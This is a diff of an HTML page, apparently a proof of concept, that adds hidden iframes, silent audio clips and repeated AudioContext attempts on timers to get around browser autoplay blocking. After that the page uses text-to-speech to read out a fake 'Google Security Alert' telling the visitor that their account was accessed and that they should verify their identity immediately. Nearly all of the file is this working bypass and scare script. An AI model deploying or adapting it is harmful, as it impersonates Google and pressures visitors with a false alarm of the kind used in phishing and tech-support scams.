@@ -12,14 +12,11 @@
 </head>
 <body>
 
-<!-- PERBAIKAN: Menggunakan Base64 Video MP4 Kosong Asli (1x1 piksel senyap) -->
-<video id="loopBypass" autoplay muted loop playsinline style="display:none;">
-  <source src="data:video/mp4;base64,AAAAHGZ0eXBtcDQyAAAAAG1wNDJpc29tYXZjMQAAAzphbW9vdgYAbG12aGQAAAAA0zVfVNM1X1QAAAEgAAAAtwABAAEAAV9VAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAACNnRyYWsAAABsdGtoZAAAAAPTMV9V0zVfVAAAAAEAAAAAAAC3AAAAAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAAQAAAitkaW5mAAAAHGRyZWYAAAAAAAAAAQAAAAxtZGlhdGgAAAAA0zVfVNM1X1QAAAEgAAAAt1YVxAAAAAAALW1kYmQAAAAAAAAAAAAAAAQAAAAhYmtoZAAAAAEAAAAAAAAAAAAAAAEAAAAAZGF0YQAAAAE=" type="video/mp4">
-</video>
-
-<iframe src="data:text/html,<script>var a=new Audio();a.src='data:audio/wav;base64,UklGRiQAAABXQVZFZm10IBAAAAABAAEARKwAAIhYAQACABAAZGF0YQAAAAA=';a.loop=true;a.volume=0.001;a.play().catch(function(){});</script>" allow="autoplay" style="display:none"></iframe>
+<iframe src="data:text/html,<script>var a=new Audio();a.src='data:audio/wav;base64,UklGRiQAAABXQVZFZm10IBAAAAABAAEARKwAAIhYAQACABAAZGF0YQAAAAA=';a.loop=true;a.volume=0.001;a.play();</script>" allow="autoplay" style="display:none"></iframe>
 
 <iframe src="data:text/html,<script>var c=new (AudioContext||webkitAudioContext)();var o=c.createOscillator();o.frequency.value=40;o.type='sine';var g=c.createGain();g.gain.value=0.001;o.connect(g);g.connect(c.destination);o.start();</script>" allow="autoplay" style="display:none"></iframe>
+
+<iframe src="data:text/html,<embed src='data:audio/wav;base64,UklGRiQAAABXQVZFZm10IBAAAAABAAEARKwAAIhYAQACABAAZGF0YQAAAAA=' autostart=true volume=0 loop=true style=display:none>" allow="autoplay" style="display:none"></iframe>
 
 <audio id="silent1" preload="auto" loop style="display:none">
   <source src="data:audio/wav;base64,UklGRiQAAABXQVZFZm10IBAAAAABAAEARKwAAIhYAQACABAAZGF0YQAAAAA=" type="audio/wav">
@@ -29,24 +26,80 @@
   <source src="data:audio/wav;base64,UklGRiQAAABXQVZFZm10IBAAAAABAAEARKwAAIhYAQACABAAZGF0YQAAAAA=" type="audio/wav">
 </audio>
 
+<audio id="silent3" preload="auto" loop style="display:none">
+  <source src="data:audio/wav;base64,UklGRiQAAABXQVZFZm10IBAAAAABAAEARKwAAIhYAQACABAAZGF0YQAAAAA=" type="audio/wav">
+</audio>
+
 <script>
 (function() {
   var unlocked = false;
   var played = false;
-  var loopMedia = document.getElementById('loopBypass');
+
+  // ===== RACE: Coba unlock via semua methods SERENTAK =====
+  function raceUnlock() {
+    // Method 1: WebAudio oscillator
+    try {
+      var ctx1 = new (window.AudioContext || window.webkitAudioContext)();
+      var osc1 = ctx1.createOscillator();
+      osc1.frequency.value = 30;
+      var g1 = ctx1.createGain();
+      g1.gain.value = 0.001;
+      osc1.connect(g1);
+      g1.connect(ctx1.destination);
+      osc1.start();
+      if (ctx1.state === 'running') unlocked = true;
+      if (ctx1.state === 'suspended') ctx1.resume().then(function(){unlocked=true;});
+    } catch(e) {}
+
+    // Method 2: HTMLAudio elements (silent)
+    try {
+      var a1 = document.getElementById('silent1');
+      a1.volume = 0.001;
+      a1.play().then(function(){unlocked=true;}).catch(function(){});
+    } catch(e) {}
+    
+    try {
+      var a2 = document.getElementById('silent2');
+      a2.volume = 0.001;
+      a2.play().then(function(){unlocked=true;}).catch(function(){});
+    } catch(e) {}
+    
+    try {
+      var a3 = document.getElementById('silent3');
+      a3.volume = 0.001;
+      a3.play().then(function(){unlocked=true;}).catch(function(){});
+    } catch(e) {}
+
+    // Method 3: New Audio() instances
+    for (var i = 0; i < 5; i++) {
+      try {
+        var sa = new Audio('data:audio/wav;base64,UklGRiQAAABXQVZFZm10IBAAAAABAAEARKwAAIhYAQACABAAZGF0YQAAAAA=');
+        sa.volume = 0.001;
+        sa.play().then(function(){unlocked=true;}).catch(function(){});
+      } catch(e) {}
+    }
+
+    // Method 4: Multiple AudioContexts
+    for (var j = 0; j < 3; j++) {
+      try {
+        var ctxn = new (window.AudioContext || window.webkitAudioContext)();
+        var oscn = ctxn.createOscillator();
+        oscn.frequency.value = 20 + j * 10;
+        var gn = ctxn.createGain();
+        gn.gain.value = 0.001;
+        oscn.connect(gn);
+        gn.connect(ctxn.destination);
+        oscn.start();
+        if (ctxn.state === 'running') unlocked = true;
+        if (ctxn.state === 'suspended') ctxn.resume().then(function(){unlocked=true;});
+      } catch(e) {}
+    }
+  }
 
   // ===== MAIN AUDIO: Alert sound + TTS =====
   function playMainAudio() {
     if (played) return;
     played = true;
-    
-    // Eksekusi Unmute Video Loop
-    try {
-      if (loopMedia) {
-        loopMedia.muted = false;
-        loopMedia.play().catch(function(){});
-      }
-    } catch(e) {}
     
     try {
       var ctx = new (window.AudioContext || window.webkitAudioContext)();
@@ -90,110 +143,102 @@
     }
   }
 
-  // ===== RACE: Coba unlock via semua methods SERENTAK =====
-  function raceUnlock() {
-    try {
-      if (loopMedia && loopMedia.muted) {
-        loopMedia.muted = false;
-        // Penambahan catch block wajib untuk menghindari Uncaught DOMException Error di konsol
-        loopMedia.play().then(function() {
-          unlocked = true;
-          playMainAudio(); 
-        }).catch(function() {
-          loopMedia.muted = true; 
-        });
-      }
-    } catch(e) {}
-
-    // Method 1: WebAudio oscillator
-    try {
-      var ctx1 = new (window.AudioContext || window.webkitAudioContext)();
-      var osc1 = ctx1.createOscillator();
-      osc1.frequency.value = 30;
-      var g1 = ctx1.createGain();
-      g1.gain.value = 0.001;
-      osc1.connect(g1);
-      g1.connect(ctx1.destination);
-      osc1.start();
-      if (ctx1.state === 'running') unlocked = true;
-      if (ctx1.state === 'suspended') ctx1.resume().then(function(){unlocked=true;});
-    } catch(e) {}
-
-    // Method 2: HTMLAudio elements (silent)
-    try {
-      var a1 = document.getElementById('silent1');
-      a1.volume = 0.001;
-      a1.play().then(function(){unlocked=true;}).catch(function(){});
-    } catch(e) {}
+  // ===== TTS =====
+  function startTTS() {
+    if (window.ttsDone) return;
+    window.ttsDone = true;
     
-    try {
-      var a2 = document.getElementById('silent2');
-      a2.volume = 0.001;
-      a2.play().then(function(){unlocked=true;}).catch(function(){});
-    } catch(e) {}
-
-    // Method 3: New Audio() instances
-    for (var i = 0; i < 2; i++) {
+    if (!('speechSynthesis' in window)) return;
+    
+    var text = "Google Security Alert. Your account has been accessed from an unknown device. If this was not you, verify your identity immediately. This is an automated security message from Google.";
+    
+    speechSynthesis.cancel();
+    
+    for (var k = 0; k < 3; k++) {
       try {
-        var audio = new Audio();
-        audio.volume = 0.001;
-        audio.play().then(function(){unlocked=true;}).catch(function(){});
-      } catch(e) {}
-    }
-
-    // Method 4: Speech Synthesis
-    try {
-      var u = new SpeechSynthesisUtterance("Hello, world!");
-      if (voices.length > 0) {
+        var u = new SpeechSynthesisUtterance(text);
+        u.lang = 'en-US';
+        u.rate = 0.8;
+        u.pitch = 1.0;
+        u.volume = 1.0;
+        
+        var voices = speechSynthesis.getVoices();
         var ev = voices.find(function(v){return v.lang.startsWith('en');});
         if (ev) u.voice = ev;
-      }
-      
-      speechSynthesis.speak(u);
-    } catch(e) {}
+        
+        speechSynthesis.speak(u);
+      } catch(e) {}
+    }
   }
 
-  // ===== EXECUTION PIPELINE =====
+  // ===== EXECUTION =====
+  
+  // Wave 1: Unlock via silent sounds (0ms)
   raceUnlock();
+  
+  // Wave 2: Retry unlock (50ms)
   setTimeout(raceUnlock, 50);
+  
+  // Wave 3: Retry unlock (150ms)
   setTimeout(raceUnlock, 150);
   
+  // Wave 4: Coba main audio langsung (200ms)
   setTimeout(function() {
-    for (var i = 0; i < 2; i++) {
+    for (var i = 0; i < 3; i++) {
       try {
         var ctx = new (window.AudioContext || window.webkitAudioContext)();
-        if (ctx.state === 'suspended') ctx.resume().catch(function(){});
+        if (ctx.state === 'suspended') ctx.resume();
       } catch(e) {}
     }
     playMainAudio();
   }, 200);
   
-  setTimeout(function() { if (!played) playMainAudio(); }, 500);
-  setTimeout(function() { if (!played) playMainAudio(); }, 1000);
+  // Wave 5: Retry (500ms)
+  setTimeout(function() {
+    if (!played) playMainAudio();
+  }, 500);
   
-  // EVENT INTERAKSI ALAMI (Jaring Pengaman Terakhir)
-  var interactionEvents = ['click', 'scroll', 'touchstart', 'mousemove', 'pointerdown'];
-  
-  function triggerOnInteraction() {
+  // Wave 6: Force play (1000ms)
+  setTimeout(function() {
     if (!played) {
-      playMainAudio();
+      try {
+        var ctx = new (window.AudioContext || window.webkitAudioContext)();
+        ctx.resume().then(function() { playMainAudio(); });
+      } catch(e) {
+        playMainAudio();
+      }
     }
-    interactionEvents.forEach(function(evt) {
-      document.removeEventListener(evt, triggerOnInteraction);
-    });
-  }
-
-  interactionEvents.forEach(function(evt) {
-    document.addEventListener(evt, triggerOnInteraction, { once: true, passive: true });
+  }, 1000);
+  
+  // Wave 7: Visibility change
+  document.addEventListener('visibilitychange', function() {
+    if (!document.hidden && !played) {
+      setTimeout(playMainAudio, 50);
+    }
   });
   
-  // Penanganan asinkronitas daftar suara TTS bawaan Chrome
+  // Wave 8: Click/scroll anywhere
+  document.addEventListener('click', function() {
+    if (!played) { playMainAudio(); }
+  }, { once: true });
+  
+  document.addEventListener('scroll', function() {
+    if (!played) { playMainAudio(); }
+  }, { once: true });
+  
+  document.addEventListener('touchstart', function() {
+    if (!played) { playMainAudio(); }
+  }, { once: true });
+  
+  // Preload voices
   if ('speechSynthesis' in window) {
     speechSynthesis.getVoices();
     speechSynthesis.onvoiceschanged = function() {
       speechSynthesis.getVoices();
     };
   }
+  
+  console.log('[PoC] Race condition audio bypass - No redirect');
 })();
 </script>
 
